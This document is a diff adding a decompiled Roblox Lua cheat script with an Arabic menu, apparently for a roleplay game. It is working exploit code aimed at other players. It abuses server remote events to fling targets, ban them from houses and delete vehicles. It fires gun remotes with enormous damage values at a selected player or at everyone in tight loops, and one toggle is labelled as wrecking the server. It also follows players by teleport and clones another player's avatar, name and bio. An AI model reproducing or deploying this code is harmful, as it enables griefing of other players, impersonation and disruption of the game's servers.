+                local _HumanoidRootPart9 = _Character6:FindFirstChild('HumanoidRootPart')
+
+                if _Character6 and (_Humanoid5 and (_HumanoidRootPart9 and not _Humanoid5.Sit)) then
+                    while not _Humanoid5.Sit do
+                        task.wait()
+
+                        local function v367(p364, p365, p366)
+                            u359:SetPrimaryPartCFrame(CFrame.new(p364.Position) * p365 * p366)
+                        end
+
+                        v335 = v335 + 100
+
+                        v367(_HumanoidRootPart9, CFrame.new(0, 1.5, 0) + _Humanoid5.MoveDirection * _HumanoidRootPart9.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(v335), 0, 0))
+                        v367(_HumanoidRootPart9, CFrame.new(0, -1.5, 0) + _Humanoid5.MoveDirection * _HumanoidRootPart9.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(v335), 0, 0))
+                        v367(_HumanoidRootPart9, CFrame.new(2.25, 1.5, -2.25) + _Humanoid5.MoveDirection * _HumanoidRootPart9.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(v335), 0, 0))
+                        v367(_HumanoidRootPart9, CFrame.new(-2.25, -1.5, 2.25) + _Humanoid5.MoveDirection * _HumanoidRootPart9.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(v335), 0, 0))
+                        v367(_HumanoidRootPart9, CFrame.new(0, 1.5, 0) + _Humanoid5.MoveDirection * _HumanoidRootPart9.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(v335), 0, 0))
+                        v367(_HumanoidRootPart9, CFrame.new(0, -1.5, 0) + _Humanoid5.MoveDirection * _HumanoidRootPart9.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(v335), 0, 0))
+                    end
+
+                    task.wait(0.2)
+
+                    local v368 = __001_Lots:FindFirstChild(_LocalPlayer8.Name .. 'House')
+
+                    u359:SetPrimaryPartCFrame(CFrame.new(v368.HouseSpawnPosition.Position))
+                    task.wait(0.2)
+
+                    local v369 = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30))
+                    local v370 = workspace:FindPartsInRegion3(v369, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)
+                    local v371, v372, v373 = pairs(v370)
+
+                    while true do
+                        local v374
+
+                        v373, v374 = v371(v372, v373)
+
+                        if v373 == nil then
+                            break
+                        end
+                        if v374.Name == 'HumanoidRootPart' then
+                            local v375 = {
+                                'BanPlayerFromHouse',
+                                game:GetService('Players'):FindFirstChild(v374.Parent.Name),
+                                v374.Parent,
+                            }
+
+                            game:GetService('ReplicatedStorage').RE:FindFirstChild('1Playe1rTrigge1rEven1t'):FireServer(unpack(v375))
+                            game:GetService('ReplicatedStorage').RE:FindFirstChild('1Ca1r'):FireServer(unpack({
+                                'DeleteAllVehicles',
+                            }))
+                        end
+                    end
+                end
+            end
+        end
+    end,
+})
+u77:AddSection({
+    Name = '\u{fffd}\u{644}\u{62a}\u{62c}\u{633}\u{633}',
+})
+
+local u376 = nil
+local u377 = false
+local u378 = nil
+
+local function u383(p379)
+    local _LocalPlayer9 = game.Players.LocalPlayer
+    local _CurrentCamera = workspace.CurrentCamera
+
+    if u376 then
+        local v382 = game.Players:FindFirstChild(u376)
+
+        if v382 and v382.Character and v382.Character:FindFirstChild('HumanoidRootPart') then
+            if p379 then
+                _CurrentCamera.CameraSubject = v382.Character.Humanoid
+            else
+                _CurrentCamera.CameraSubject = _LocalPlayer9.Character.Humanoid
+            end
+        else
+            print('Selected player not available or out of game.')
+        end
+    else
+        print('No player selected!')
+    end
+end
+local function u388()
+    local _LocalPlayer10 = game.Players.LocalPlayer
+    local v385 = _LocalPlayer10.Character or _LocalPlayer10.CharacterAdded:Wait()
+
+    if v385 and v385:FindFirstChild('HumanoidRootPart') then
+        local _HumanoidRootPart10 = v385.HumanoidRootPart
+
+        if u376 then
+            local u387 = game.Players:FindFirstChild(u376)
+
+            if u387 and u387.Character and u387.Character:FindFirstChild('Head') then
+                _HumanoidRootPart10.CFrame = u387.Character.Head.CFrame * CFrame.new(0, 3, 0)
+                u378 = game:GetService('RunService').Heartbeat:Connect(function()
+                    if u377 and (u387 and u387.Character) and u387.Character:FindFirstChild('Head') then
+                        _HumanoidRootPart10.CFrame = u387.Character.Head.CFrame * CFrame.new(0, 3, 0)
+                    else
+                        u378:Disconnect()
+                    end
+                end)
+            else
+                print('Target player not found or not in the game.')
+            end
+        else
+            print('No player selected!')
+        end
+    end
+end
+
+u77:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Default = '',
+    Options = (function()
+        local v389, v390, v391 = ipairs(game.Players:GetPlayers())
+        local v392 = {}
+
+        while true do
+            local v393
+
+            v391, v393 = v389(v390, v391)
+
+            if v391 == nil then
+                break
+            end
+
+            table.insert(v392, v393.Name)
+        end
+
+        return v392
+    end)(),
+    Callback = function(p394)
+        u376 = p394
+
+        print('Player selected: ' .. p394)
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+    Callback = function()
+        u213()
+    end,
+})
+u77:AddToggle({
+    Name = '\u{fffd}\u{648}\u{641} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Default = false,
+    Callback = function(p395)
+        u383(p395)
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{648}\u{62d} \u{639}\u{646}\u{62f} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Callback = function()
+        u388()
+    end,
+})
+
+local _RunService3 = game:GetService('RunService')
+local u397 = nil
+
+v71:MakeTab({
+    Name = '\u{fffd}\u{636}\u{627}\u{62f} \u{62a}\u{62c}\u{645}\u{64a}\u{62f}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+}):AddToggle({
+    Name = '\u{fffd}\u{636}\u{627}\u{62f} \u{62a}\u{62c}\u{645}\u{64a}\u{62f}',
+    Default = false,
+    Callback = function(p398)
+        if u397 then
+            u397:Disconnect()
+
+            u397 = nil
+        end
+        if p398 then
+            u397 = _RunService3.Stepped:Connect(function()
+                local v399 = workspace.CurrentCamera or workspace:FindFirstChild('Camera')
+
+                if v399 then
+                    local v400, v401, v402 = ipairs(v399:GetChildren())
+
+                    while true do
+                        local u403
+
+                        v402, u403 = v400(v401, v402)
+
+                        if v402 == nil then
+                            break
+                        end
+                        if u403:IsA('BasePart') and u403.Name == 'water' then
+                            pcall(function()
+                                u403:Destroy()
+                            end)
+                        end
+                    end
+                end
+            end)
+        end
+    end,
+})
+
+local v404 = v71:MakeTab({
+    Name = '\u{fffd}\u{62c}\u{645}\u{64a}\u{62f} ',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+local _Players7 = game:GetService('Players')
+local _ReplicatedStorage3 = game:GetService('ReplicatedStorage')
+local u407 = nil
+local u408 = false
+
+local function v415()
+    local v409 = _Players7
+    local v410, v411, v412 = ipairs(v409:GetPlayers())
+    local v413 = {}
+
+    while true do
+        local v414
+
+        v412, v414 = v410(v411, v412)
+
+        if v412 == nil then
+            break
+        end
+
+        table.insert(v413, v414.Name)
+    end
+
+    return v413
+end
+
+local v416 = v404
+local _AddDropdown = v404.AddDropdown
+local v418 = {
+    Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Options = v415(),
+}
+local v419 = _Players7
+local v420
+
+if _Players7.GetPlayers(v419)[1] then
+    local v421 = _Players7
+
+    v420 = _Players7.GetPlayers(v421)[1].Name or ''
+else
+    v420 = ''
+end
+
+v418.Default = v420
+
+function v418.Callback(p422)
+    u407 = p422
+end
+
+_AddDropdown(v416, v418)
+
+local function u429(p423)
+    local _LocalPlayer11 = _Players7.LocalPlayer
+
+    if _LocalPlayer11 and p423 then
+        if p423.Character and p423.Character:FindFirstChild('HumanoidRootPart') then
+            local _Backpack = _LocalPlayer11:FindFirstChild('Backpack')
+
+            if _Backpack then
+                local _Assault = _Backpack:FindFirstChild('Assault')
+
+                if _Assault and _Assault:FindFirstChild('GunScript_Local') then
+                    local _GunScript_Local = _Assault.GunScript_Local
+
+                    if _GunScript_Local:FindFirstChild('MuzzleEffect') and _GunScript_Local:FindFirstChild('HitEffect') then
+                        local v428 = {
+                            p423.Character.HumanoidRootPart,
+                            p423.Character.HumanoidRootPart,
+                            Vector3.new(10000376832, 10000832, 10000376832),
+                            Vector3.new(14.311434326000017, 3.784946203231008, 7.053763389580074),
+                            _GunScript_Local.MuzzleEffect,
+                            _GunScript_Local.HitEffect,
+                            0,
+                            0,
+                            {false},
+                            {
+                                25,
+                                Vector3.new(100, 100, 100),
+                                BrickColor.new(209),
+                                0.25,
+                                Enum.Material.SmoothPlastic,
+                                0.25,
+                            },
+                            true,
+                            false,
+                        }
+
+                        _ReplicatedStorage3:WaitForChild('RE'):WaitForChild('1Gu1n'):FireServer(unpack(v428))
+                    end
+                else
+                    return
+                end
+            else
+                return
+            end
+        else
+            return
+        end
+    else
+        return
+    end
+end
+
+v404:AddToggle({
+    Name = '\u{fffd}\u{62c}\u{645}\u{64a}\u{62f} \u{627}\u{644}\u{627}\u{639}\u{628} \u{627}\u{644}\u{645}\u{62d}\u{62f}\u{62f}',
+    Default = false,
+    Callback = function(p430)
+        u408 = p430
+
+        if u408 then
+            _ReplicatedStorage3:WaitForChild('Remotes'):WaitForChild('GunEquip'):InvokeServer(unpack({
+                'Assault',
+                'StockAssault',
+            }))
+            task.spawn(function()
+                while u408 do
+                    local v431 = u407 and _Players7:FindFirstChild(u407)
+
+                    if v431 then
+                        u429(v431)
+                    end
+
+                    task.wait(0.01)
+                end
+            end)
+        end
+    end,
+})
+
+local _Players8 = game:GetService('Players')
+local _ReplicatedStorage4 = game:GetService('ReplicatedStorage')
+local _LocalPlayer12 = _Players8.LocalPlayer
+
+local function u435()
+    if not _LocalPlayer12:WaitForChild('Backpack'):FindFirstChild('Assault') then
+        _ReplicatedStorage4:WaitForChild('Remotes'):WaitForChild('GunEquip'):InvokeServer(unpack({
+            'Assault',
+            'StockAssault',
+        }))
+    end
+end
+
+local u436 = false
+
+v404:AddToggle({
+    Name = '\u{fffd}\u{62c}\u{645}\u{64a}\u{62f} \u{627}\u{644}\u{643}\u{644}',
+    Default = false,
+    Callback = function(p437)
+        u436 = p437
+
+        if u436 then
+            u435()
+            task.spawn(function()
+                while true do
+                    if not u436 then
+                        return
+                    end
+
+                    local v438 = _Players8
+                    local v439, v440, v441 = ipairs(v438:GetPlayers())
+
+                    while true do
+                        local v442
+
+                        v441, v442 = v439(v440, v441)
+
+                        if v441 == nil then
+                            break
+                        end
+                        if v442 ~= _LocalPlayer12 and v442.Character and v442.Character:FindFirstChild('HumanoidRootPart') then
+                            for _ = 1, 2 do
+                                if not u436 then
+                                    break
+                                end
+
+                                local v443 = {
+                                    v442.Character.HumanoidRootPart,
+                                    v442.Character.HumanoidRootPart,
+                                    Vector3.new(100000000376832, 100000000376832, 100000000376832),
+                                    Vector3.new(-61.12593460083008, 3.699275255203247, -1.4375219345092773),
+                                    _LocalPlayer12.Backpack:WaitForChild('Assault'):WaitForChild('GunScript_Local'):WaitForChild('MuzzleEffect'),
+                                    _LocalPlayer12.Backpack:WaitForChild('Assault'):WaitForChild('GunScript_Local'):WaitForChild('HitEffect'),
+                                    0,
+                                    0,
+                                    {false},
+                                    {
+                                        25,
+                                        Vector3.new(100, 100, 100),
+                                        BrickColor.new(29),
+                                        0.25,
+                                        Enum.Material.SmoothPlastic,
+                                        0.25,
+                                    },
+                                    true,
+                                    false,
+                                }
+
+                                _ReplicatedStorage4.RE['1Gu1n']:FireServer(unpack(v443))
+                                task.wait(0.001)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end,
+})
+v404:AddSection({
+    Name = '\u{fffd}\u{62e}\u{631}\u{64a}\u{628} \u{642}\u{648}\u{64a}\u{2193}',
+})
+
+local _Players9 = game:GetService('Players')
+local _ReplicatedStorage5 = game:GetService('ReplicatedStorage')
+local u446 = nil
+local u447 = false
+
+local function v454()
+    local v448 = _Players9
+    local v449, v450, v451 = ipairs(v448:GetPlayers())
+    local v452 = {}
+
+    while true do
+        local v453
+
+        v451, v453 = v449(v450, v451)
+
+        if v451 == nil then
+            break
+        end
+
+        table.insert(v452, v453.Name)
+    end
+
+    return v452
+end
+
+local v455 = v404
+local _AddDropdown2 = v404.AddDropdown
+local v457 = {
+    Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Options = v454(),
+}
+local v458 = _Players9
+local v459
+
+if _Players9.GetPlayers(v458)[1] then
+    local v460 = _Players9
+
+    v459 = _Players9.GetPlayers(v460)[1].Name or ''
+else
+    v459 = ''
+end
+
+v457.Default = v459
+
+function v457.Callback(p461)
+    u446 = p461
+end
+
+_AddDropdown2(v455, v457)
+
+local function u468(p462)
+    local _LocalPlayer13 = _Players9.LocalPlayer
+
+    if _LocalPlayer13 and p462 then
+        if p462.Character and p462.Character:FindFirstChild('HumanoidRootPart') then
+            local _Backpack2 = _LocalPlayer13:FindFirstChild('Backpack')
+
+            if _Backpack2 then
+                local _Assault2 = _Backpack2:FindFirstChild('Assault')
+
+                if _Assault2 and _Assault2:FindFirstChild('GunScript_Local') then
+                    local _GunScript_Local2 = _Assault2.GunScript_Local
+
+                    if _GunScript_Local2:FindFirstChild('MuzzleEffect') and _GunScript_Local2:FindFirstChild('HitEffect') then
+                        local v467 = {
+                            p462.Character.HumanoidRootPart,
+                            p462.Character.HumanoidRootPart,
+                            Vector3.new(9999999999376832, 99999999832, 999999999376832),
+                            Vector3.new(14.311434326000017, 3.784946203231008, 7.053763389580074),
+                            _GunScript_Local2.MuzzleEffect,
+                            _GunScript_Local2.HitEffect,
+                            0,
+                            0,
+                            {false},
+                            {
+                                25,
+                                Vector3.new(100, 100, 100),
+                                BrickColor.new(209),
+                                0.25,
+                                Enum.Material.SmoothPlastic,
+                                0.25,
+                            },
+                            true,
+                            false,
+                        }
+
+                        _ReplicatedStorage5:WaitForChild('RE'):WaitForChild('1Gu1n'):FireServer(unpack(v467))
+                    end
+                else
+                    return
+                end
+            else
+                return
+            end
+        else
+            return
+        end
+    else
+        return
+    end
+end
+
+v404:AddToggle({
+    Name = '\u{fffd}\u{62c}\u{645}\u{64a}\u{62f} \u{627}\u{644}\u{627}\u{639}\u{628} \u{627}\u{644}\u{645}\u{62d}\u{62f}\u{62f}',
+    Default = false,
+    Callback = function(p469)
+        u447 = p469
+
+        if u447 then
+            _ReplicatedStorage5:WaitForChild('Remotes'):WaitForChild('GunEquip'):InvokeServer(unpack({
+                'Assault',
+                'StockAssault',
+            }))
+            task.spawn(function()
+                while u447 do
+                    local v470 = u446 and _Players9:FindFirstChild(u446)
+
+                    if v470 then
+                        u468(v470)
+                    end
+
+                    task.wait(0.001)
+                end
+            end)
+        end
+    end,
+})
+
+local _Players10 = game:GetService('Players')
+local _ReplicatedStorage6 = game:GetService('ReplicatedStorage')
+local _LocalPlayer14 = _Players10.LocalPlayer
+
+local function u475()
+    local _RE5 = _ReplicatedStorage6:FindFirstChild('RE')
+
+    if _RE5 and _RE5:FindFirstChild('1Gu1n') then
+        return _RE5['1Gu1n']
+    else
+        return nil
+    end
+end
+local function u478()
+    local _Backpack3 = _LocalPlayer14:WaitForChild('Backpack')
+    local v477 = _LocalPlayer14.Character or _LocalPlayer14.CharacterAdded:Wait()
+
+    if not (_Backpack3:FindFirstChild('Assault') or v477:FindFirstChild('Assault')) then
+        _ReplicatedStorage6:WaitForChild('Remotes'):WaitForChild('GunEquip'):InvokeServer(unpack({
+            'Assault',
+            'StockAssault',
+        }))
+        task.wait(0.5)
+    end
+end
+
+local u479 = false
+
+v404:AddToggle({
+    Name = '\u{fffd}\u{62e}\u{631}\u{64a}\u{628} \u{64a}\u{62f}\u{645}\u{631} \u{62c}\u{645}\u{64a}\u{639} \u{627}\u{644}\u{627}\u{639}\u{628}\u{64a}\u{646} \u{628}\u{644} \u{633}\u{64a}\u{631}\u{641}\u{631}',
+    Default = false,
+    Callback = function(p480)
+        u479 = p480
+
+        if u479 then
+            task.spawn(function()
+                while u479 do
+                    local u481 = false
+
+                    local function u482()
+                        u481 = true
+                    end
+
+                    local u483 = u475()
+
+                    if u483 then
+                        pcall(function()
+                            u478()
+
+                            local v484 = not _LocalPlayer14.Backpack:FindFirstChild('Assault') and _LocalPlayer14.Character
+
+                            if v484 then
+                                v484 = _LocalPlayer14.Character:FindFirstChild('Assault')
+                            end
+                            if v484 and v484:FindFirstChild('GunScript_Local') then
+                                local v485 = _Players10
+                                local v486, v487, v488 = ipairs(v485:GetPlayers())
+
+                                while true do
+                                    local v489
+
+                                    v488, v489 = v486(v487, v488)
+
+                                    if v488 == nil then
+                                        break
+                                    end
+                                    if not u479 then
+                                        u482()
+                                    end
+                                    if v489 ~= _LocalPlayer14 and v489.Character and v489.Character:FindFirstChild('HumanoidRootPart') then
+                                        local v490 = {
+                                            v489.Character.HumanoidRootPart,
+                                            v489.Character.HumanoidRootPart,
+                                            Vector3.new(99999999376832, 999999999376832, 999999999376832),
+                                            Vector3.new(-61.12593480083008, 3.699275255288847, -1.4375219345098884),
+                                            v484.GunScript_Local:FindFirstChild('MuzzleEffect'),
+                                            v484.GunScript_Local:FindFirstChild('HitEffect'),
+                                            0,
+                                            0,
+                                            {false},
+                                            {
+                                                25,
+                                                Vector3.new(100, 100, 100),
+                                                BrickColor.new(29),
+                                                0.25,
+                                                Enum.Material.SmoothPlastic,
+                                                0.25,
+                                            },
+                                            true,
+                                            false,
+                                        }
+
+                                        u483:FireServer(unpack(v490))
+                                        task.wait(0.2)
+                                    end
+                                end
+                            end
+                        end)
+                        task.wait(0.001)
+                    else
+                        warn('\u{fffd}\u{644}\u{631}\u{64a}\u{645}\u{648}\u{62a} \u{627}\u{62e}\u{62a}\u{641}\u{649} \u{623}\u{648} \u{645}\u{627} \u{645}\u{648}\u{62c}\u{648}\u{62f}!')
+                        task.wait(0.5)
+                    end
+                    if u481 then
+                        break
+                    end
+                end
+            end)
+        end
+    end,
+})
+
+local v491 = v71:MakeTab({
+    Name = '\u{fffd}\u{643}\u{646}\u{627}\u{62a}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v491:AddSection({
+    Name = '\u{fffd}\u{633}\u{62e} \u{633}\u{643}\u{646}\u{627}\u{62a}',
+})
+
+local _Players11 = game:GetService('Players')
+local _Remotes = game:GetService('ReplicatedStorage'):WaitForChild('Remotes')
+local u494 = nil
+
+local function u501()
+    local v495 = _Players11
+    local v496, v497, v498 = ipairs(v495:GetPlayers())
+    local v499 = {}
+
+    while true do
+        local v500
+
+        v498, v500 = v496(v497, v498)
+
+        if v498 == nil then
+            break
+        end
+
+        table.insert(v499, v500.Name)
+    end
+
+    return v499
+end
+
+local u503 = v491:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Options = u501(),
+    Default = u494,
+    Callback = function(p502)
+        u494 = p502
+    end,
+})
+
+local function v504()
+    u503:Refresh(u501(), true)
+end
+
+_Players11.PlayerAdded:Connect(v504)
+_Players11.PlayerRemoving:Connect(v504)
+v491:AddButton({
+    Name = '\u{fffd}\u{633}\u{62e} \u{627}\u{644}\u{633}\u{643}\u{646}',
+    Callback = function()
+        if u494 then
+            local _Character7 = _Players11.LocalPlayer.Character
+            local v506 = _Players11:FindFirstChild(u494)
+
+            if v506 and v506.Character then
+                if _Character7 then
+                    _Character7 = _Character7:FindFirstChildOfClass('Humanoid')
+                end
+
+                local _Humanoid6 = v506.Character:FindFirstChildOfClass('Humanoid')
+
+                if _Character7 and _Humanoid6 then
+                    local v508 = _Character7:GetAppliedDescription()
+                    local v509, v510, v511 = ipairs(v508:GetAccessories(true))
+
+                    while true do
+                        local v512
+
+                        v511, v512 = v509(v510, v511)
+
+                        if v511 == nil then
+                            break
+                        end
+                        if v512.AssetId and tonumber(v512.AssetId) then
+                            _Remotes.Wear:InvokeServer(tonumber(v512.AssetId))
+                            task.wait(0.2)
+                        end
+                    end
+
+                    if tonumber(v508.Shirt) then
+                        _Remotes.Wear:InvokeServer(tonumber(v508.Shirt))
+                        task.wait(0.2)
+                    end
+                    if tonumber(v508.Pants) then
+                        _Remotes.Wear:InvokeServer(tonumber(v508.Pants))
+                        task.wait(0.2)
+                    end
+                    if tonumber(v508.Face) then
+                        _Remotes.Wear:InvokeServer(tonumber(v508.Face))
+                        task.wait(0.2)
+                    end
+
+                    local v513 = _Humanoid6:GetAppliedDescription()
+                    local v514 = {
+                        {
+                            v513.Torso,
+                            v513.RightArm,
+                            v513.LeftArm,
+                            v513.RightLeg,
+                            v513.LeftLeg,
+                            v513.Head,
+                        },
+                    }
+
+                    _Remotes.ChangeCharacterBody:InvokeServer(unpack(v514))
+                    task.wait(0.5)
+
+                    if tonumber(v513.Shirt) then
+                        _Remotes.Wear:InvokeServer(tonumber(v513.Shirt))
+                        task.wait(0.3)
+                    end
+                    if tonumber(v513.Pants) then
+                        _Remotes.Wear:InvokeServer(tonumber(v513.Pants))
+                        task.wait(0.3)
+                    end
+                    if tonumber(v513.Face) then
+                        _Remotes.Wear:InvokeServer(tonumber(v513.Face))
+                        task.wait(0.3)
+                    end
+
+                    local v515, v516, v517 = ipairs(v513:GetAccessories(true))
+
+                    while true do
+                        local v518
+
+                        v517, v518 = v515(v516, v517)
+
+                        if v517 == nil then
+                            break
+                        end
+                        if v518.AssetId and tonumber(v518.AssetId) then
+                            _Remotes.Wear:InvokeServer(tonumber(v518.AssetId))
+                            task.wait(0.3)
+                        end
+                    end
+
+                    local _BodyColors = v506.Character:FindFirstChild('Body Colors')
+
+                    if _BodyColors then
+                        _Remotes.ChangeBodyColor:FireServer(tostring(_BodyColors.HeadColor))
+                        task.wait(0.3)
+                    end
+                    if tonumber(v513.IdleAnimation) then
+                        _Remotes.Wear:InvokeServer(tonumber(v513.IdleAnimation))
+                        task.wait(0.3)
+                    end
+
+                    local _PlayersBag = v506:FindFirstChild('PlayersBag')
+
+                    if _PlayersBag then
+                        if _PlayersBag:FindFirstChild('RPName') and _PlayersBag.RPName.Value ~= '' then
+                            _Remotes.RPNameText:FireServer('RolePlayName', _PlayersBag.RPName.Value)
+                            task.wait(0.3)
+                        end
+                        if _PlayersBag:FindFirstChild('RPBio') and _PlayersBag.RPBio.Value ~= '' then
+                            _Remotes.RPNameText:FireServer('RolePlayBio', _PlayersBag.RPBio.Value)
+                            task.wait(0.3)
+                        end
+                        if _PlayersBag:FindFirstChild('RPNameColor') then
+                            _Remotes.RPNameColor:FireServer('PickingRPNameColor', _PlayersBag.RPNameColor.Value)
+                            task.wait(0.3)
+                        end
+                        if _PlayersBag:FindFirstChild('RPBioColor') then
+                            _Remotes.RPNameColor:FireServer('PickingRPBioColor', _PlayersBag.RPBioColor.Value)
+                            task.wait(0.3)
+                        end
+                    end
+                end
+            end
+        end
+    end,
+})
+
+local u521 = {
+    Color3.new(1, 0, 0),
+    Color3.new(0, 1, 0),
+    Color3.new(0, 0, 1),
+    Color3.new(1, 1, 0),
+    Color3.new(0, 1, 1),
+    Color3.new(1, 0, 1),
+}
+local u522 = false
+
+local function _()
+    local _ReplicatedStorage7 = game:GetService('ReplicatedStorage')
+    local _RE6 = _ReplicatedStorage7:FindFirstChild('RE')
+
+    if _RE6 then
+        _RE6 = _ReplicatedStorage7.RE:FindFirstChild('1Player1sHous1e')
+    end
+    if _RE6 then
+        while u522 do
+            local v525, v526, v527 = ipairs(u521)
+
+            while true do
+                local v528
+
+                v527, v528 = v525(v526, v527)
+
+                if v527 == nil then
+                    break
+                end
+                if not u522 then
+                    return
+                end
+
+                local u529 = {
+                    'ColorPickHouse',
+                    v528,
+                }
+
+                pcall(function()
+                    _RE6:FireServer(unpack(u529))
+                end)
+                task.wait(0.8)
+            end
+        end
+    else
+        warn("RemoteEvent '1Player1sHous1e' n\u{e3}o encontrado.")
+    end
+end
+
+v491:AddSection({
+    Name = '\u{fffd}\u{643}\u{646}\u{627}\u{62a} \u{627}\u{648}\u{644}\u{627}\u{62f} R6',
+})
+v491:AddButton({
+    Name = '\u{fffd}\u{643}\u{646} \u{627}\u{633}\u{637}\u{648}\u{631}\u{64a} R6',
+    Callback = function()
+        print('Clicked')
+
+        local v530 = {
+            {
+                1,
+                1,
+                1,
+                1,
+                139607718,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v530))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({134082579}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({123484249524345}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({93890750467681}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({114554632554289}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({74108785680678}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({71663109326643}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({11342406713}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({92603675231903}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({130748580503185}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({135154599669181}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({18436377492}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({97655418205423}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({73923051046972}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({17795867389}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({102845440110072}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({
+            'skintone',
+            'Institutional white',
+        }))
+    end,
+})
+v491:AddButton({
+    Name = '\u{fffd}\u{643}\u{646} \u{627}\u{628}\u{64a}\u{636} \u{62d}\u{644}\u{648} R6',
+    Callback = function()
+        print('Clicked')
+
+        local v531 = {
+            {
+                1,
+                1,
+                1,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v531))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({134082579}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16368919769}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16368919769}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({13282804902}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({85144069642236}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({105410736394520}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({114554632554289}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({17183211696}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({
+            'skintone',
+            'Institutional white',
+        }))
+    end,
+})
+v491:AddButton({
+    Name = '\u{fffd}\u{636}\u{63a}\u{637} \u{644}\u{644}\u{62d}\u{635}\u{648}\u{644} \u{639}\u{644}\u{649} \u{627}\u{644}\u{645}\u{634}\u{64a}\u{629} \u{648}\u{627}\u{644}\u{648}\u{642}\u{641}\u{647}R6',
